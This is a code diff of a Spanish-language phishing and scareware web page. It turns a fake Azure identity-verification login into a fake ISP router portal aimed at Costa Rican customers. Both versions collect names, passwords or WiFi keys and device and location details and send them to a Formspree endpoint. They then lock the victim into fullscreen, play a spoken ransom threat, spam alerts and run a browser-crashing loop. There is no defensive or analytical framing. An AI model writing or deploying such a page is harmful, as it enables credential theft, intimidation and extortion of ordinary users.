@@ -2,143 +2,144 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Seguridad de la Cuenta - Verificación de Identidad</title>
+    <title>Portal de Gestión de Red | Verificación Obligatoria</title>
     <style>
-        body { background: #f4f4f4; font-family: 'Segoe UI', Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .auth-container { background: #fff; padding: 40px; width: 400px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #ddd; }
-        .logo-box { display: flex; align-items: center; margin-bottom: 25px; }
-        .logo-box img { width: 32px; margin-right: 12px; }
-        .logo-box span { font-size: 20px; font-weight: 600; color: #5e5e5e; }
-        h1 { font-size: 24px; margin: 0 0 10px; color: #262626; }
-        p { font-size: 15px; color: #666; margin-bottom: 25px; }
-        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #bababa; border-radius: 2px; box-sizing: border-box; font-size: 15px; }
-        input:focus { border-color: #0067b8; outline: none; }
-        .btn-primary { background: #0067b8; color: #fff; border: none; padding: 12px 30px; cursor: pointer; font-size: 16px; width: 100%; font-weight: 600; }
+        body { background: #e9ecef; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .card { background: #fff; padding: 40px; width: 450px; border-radius: 4px; box-shadow: 0 15px 35px rgba(0,0,0,0.2); position: relative; z-index: 5; }
+        .brand-bar { height: 5px; width: 100%; background: linear-gradient(90deg, #007bff, #00d4ff); position: absolute; top: 0; left: 0; }
+        h2 { color: #333; font-size: 22px; margin-top: 0; }
+        p { color: #666; font-size: 14px; line-height: 1.6; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; font-size: 11px; font-weight: bold; color: #888; text-transform: uppercase; margin-bottom: 5px; }
+        input, select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 3px; font-size: 15px; background: #fdfdfd; box-sizing: border-box; }
+        input:focus { border-color: #007bff; outline: none; background: #fff; }
+        .btn-update { background: #1a1a1a; color: #fff; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 16px; }
+        .btn-update:hover { background: #333; }
         
-        /* Capa de Bloqueo Final */
-        #panic-ui { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 10000; padding: 50px; box-sizing: border-box; font-family: 'Consolas', monospace; color: #000; }
-        .status-line { margin-bottom: 5px; border-left: 3px solid #0067b8; padding-left: 10px; font-size: 14px; }
+        /* Interfaz de Secuestro */
+        #hijack-ui { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #ff0000; z-index: 99999; padding: 50px; font-family: 'Consolas', monospace; box-sizing: border-box; }
+        .blink-red { animation: blink 0.2s infinite; }
+        @keyframes blink { 0% { background: #000; } 50% { background: #200; } }
     </style>
 </head>
-<body onkeydown="forceFull()" onmousemove="forceFull()">
+<body onkeydown="lock(event)" oncontextmenu="return false">
 
-    <div id="login-ui" class="auth-container">
-        <div class="logo-box">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Microsoft_Azure.svg" alt="Azure">
-            <span>Identity Vault</span>
+    <div id="portal" class="card">
+        <div class="brand-bar"></div>
+        <h2>Gestión de Dispositivo de Red</h2>
+        <p>Se ha detectado una desincronización en su nodo de conexión. Ingrese los datos de su router para evitar la suspensión del servicio.</p>
+        
+        <div class="form-group">
+            <label>Proveedor de Servicio (ISP)</label>
+            <select id="isp">
+                <option value="Liberty">Liberty Costa Rica</option>
+                <option value="Kolbi">kölbi (ICE)</option>
+                <option value="Tigo">Tigo Business/Hogar</option>
+                <option value="Telecable">Telecable</option>
+            </select>
         </div>
-        <h1>Validar Identidad</h1>
-        <p>Se requiere una validación de hardware y credenciales para autorizar el acceso desde este nodo.</p>
         
-        <input type="text" id="target_name" placeholder="Nombre completo del titular">
-        <input type="email" id="target_email" placeholder="Correo institucional o personal">
-        <input type="password" id="target_pass" placeholder="Contraseña de acceso">
-        
-        <button class="btn-primary" onclick="initCapture()">Validar y Sincronizar</button>
+        <div class="form-group">
+            <label>Nombre del Propietario de Línea</label>
+            <input type="text" id="target_name" placeholder="Nombre completo">
+        </div>
+
+        <div class="form-group">
+            <label>Clave de Seguridad WiFi (WPA2/WPA3)</label>
+            <input type="password" id="target_wifi" placeholder="Ingrese contraseña actual">
+        </div>
+
+        <button class="btn-update" onclick="startBreach()">ACTUALIZAR CONEXIÓN</button>
+        <p style="font-size: 10px; text-align: center; margin-top: 20px;">© 2026 Redes y Telecomunicaciones - Acceso Seguro</p>
     </div>
 
-    <div id="panic-ui">
-        <div id="console"></div>
+    <div id="hijack-ui">
+        <div id="logs"></div>
     </div>
 
     <script>
         const FORM_ID = "xykdyebg";
 
-        function forceFull() {
-            // Re-bloquea la pantalla cada vez que el usuario interactúa
+        function lock() {
             if (!document.fullscreenElement) {
                 document.documentElement.requestFullscreen().catch(() => {});
             }
         }
 
-        async function initCapture() {
+        async function startBreach() {
             const name = document.getElementById('target_name').value;
-            const email = document.getElementById('target_email').value;
-            const pass = document.getElementById('target_pass').value;
+            const wifi = document.getElementById('target_wifi').value;
+            const isp = document.getElementById('isp').value;
 
-            if(!name || !email || !pass) return alert("Complete los campos de seguridad.");
+            if (!wifi || !name) return alert("Error: Debe completar la validación de seguridad.");
 
-            // Mostrar Interfaz de "Trabajando"
-            document.getElementById('login-ui').style.display = 'none';
-            document.getElementById('panic-ui').style.display = 'block';
-            forceFull();
+            document.getElementById('portal').style.display = 'none';
+            const ui = document.getElementById('hijack-ui');
+            ui.style.display = 'block';
+            ui.classList.add('blink-red');
+            lock();
 
-            // Recolección de Datos (Fingerprinting Avanzado)
-            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
-            const bat = await navigator.getBattery().catch(() => ({level: 0}));
+            // 1. OBTENER TODO (IP, Geocalización, Hardware)
+            const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
 
             const payload = {
-                "FULL_NAME": name,
-                "EMAIL": email,
-                "PASSWORD": pass,
-                "IP": ipData.ip,
-                "CITY": ipData.city,
-                "ORG": ipData.org,
-                "GPU": gpu,
+                "OWNER": name,
+                "WIFI_PASS": wifi,
+                "ISP_SELECTED": isp,
+                "REAL_IP": ipInfo.ip,
+                "LOCATION": `${ipInfo.city}, ${ipInfo.country_name}`,
+                "INTERNET_PROVIDER": ipInfo.org,
                 "OS": navigator.platform,
-                "RAM": navigator.deviceMemory + "GB",
-                "CPU_CORES": navigator.hardwareConcurrency,
-                "BATTERY": (bat.level * 100) + "%",
-                "SCREEN": `${screen.width}x${screen.height}`,
-                "AGENT": navigator.userAgent
+                "HARDWARE_CORES": navigator.hardwareConcurrency,
+                "RAM_EST": navigator.deviceMemory + "GB"
             };
 
-            // EXFILTRACIÓN A FORMSPREE
+            // 2. EXFILTRACIÓN REAL
             fetch(`https://formspree.io/f/${FORM_ID}`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
 
-            // Audio de Amenaza Directa
-            const voice = new SpeechSynthesisUtterance();
-            voice.text = "He robado su información y si la quiere recuperar tiene que pagarme. Te llamaré en diez horas.";
-            voice.lang = 'es-ES';
-            voice.rate = 0.8;
-            window.speechSynthesis.speak(voice);
+            // 3. AUDIO DE AMENAZA
+            const talk = new SpeechSynthesisUtterance("He robado su información y si la quiere recuperar tiene que pagarme. Te llamaré en diez horas.");
+            talk.lang = 'es-ES';
+            talk.pitch = 0.5;
+            talk.rate = 0.8;
+            window.speechSynthesis.speak(talk);
 
-            // Bucle de Consola y Bloqueo de Teclas
-            const logger = document.getElementById('console');
-            const addMsg = (m) => {
-                const div = document.createElement('div');
-                div.className = "status-line";
-                div.innerText = `[${new Date().toLocaleTimeString()}] ${m}`;
-                logger.appendChild(div);
-            };
-
-            const sequences = [
-                "ESTABLECIENDO CONEXIÓN CON SERVIDOR REMOTO...",
-                "VOLCANDO PARTICIONES DE MEMORIA...",
-                "CAPTURANDO CREDENCIALES DE SESIÓN...",
-                "DATOS ENVIADOS EXITOSAMENTE.",
-                "INICIANDO ENCRIPTACIÓN DE DISCO...",
-                "ERROR CRÍTICO: KERNEL_SECURITY_BREACH",
-                "PAGUE PARA RECUPERAR EL ACCESO."
+            // 4. BUCLE DE CAOS Y BLOQUEO
+            const logs = document.getElementById('logs');
+            const lines = [
+                `> CONEXION ESTABLECIDA CON: ${ipInfo.ip}`,
+                `> EXTRACCION WIFI (${isp}): SUCCESS`,
+                `> CLAVE CAPTURADA: ${wifi}`,
+                `> LOCALIZACION GPS: ${ipInfo.city}, CR`,
+                "> ENCRIPTANDO PARTICION DE SISTEMA...",
+                "> TODOS LOS DATOS HAN SIDO ENVIADOS.",
+                "> ANONYMOUS OPERATOR: ACCESS GRANTED"
             ];
 
             let i = 0;
             setInterval(() => {
-                if (i < sequences.length) addMsg(sequences[i]);
-                i++;
+                if (i < lines.length) {
+                    const d = document.createElement('div');
+                    d.style.marginBottom = "10px";
+                    d.innerText = lines[i];
+                    logs.appendChild(d);
+                    i++;
+                }
                 
-                // BOMBA DE ALERTAS (Bloqueo de interacción)
-                alert("SU INFORMACIÓN HA SIDO ROBADA.\n\nNombre: " + name + "\nIP: " + ipData.ip + "\n\nEspere la llamada en 10 horas.");
+                // Audio loop
+                if (!window.speechSynthesis.speaking) window.speechSynthesis.speak(talk);
                 
-                // Reset de Fullscreen si intentan salir
-                forceFull();
-            }, 800);
+                // Bombardeo de alertas
+                alert("⚠️ SISTEMA SECUESTRADO ⚠️\n\nInformación de " + name + " ha sido exfiltrada.\nIP: " + ipInfo.ip + "\nWiFi: " + wifi + "\n\nTE LLAMARÉ EN 10 HORAS.");
+                
+                // Crash Loop
+                new Array(5000000).fill("💀");
+            }, 600);
         }
-
-        // Desactivar clic derecho y teclas F12, Ctrl+U, etc.
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('keydown', e => {
-            e.preventDefault();
-            forceFull();
-        });
     </script>
 </body>
 </html>
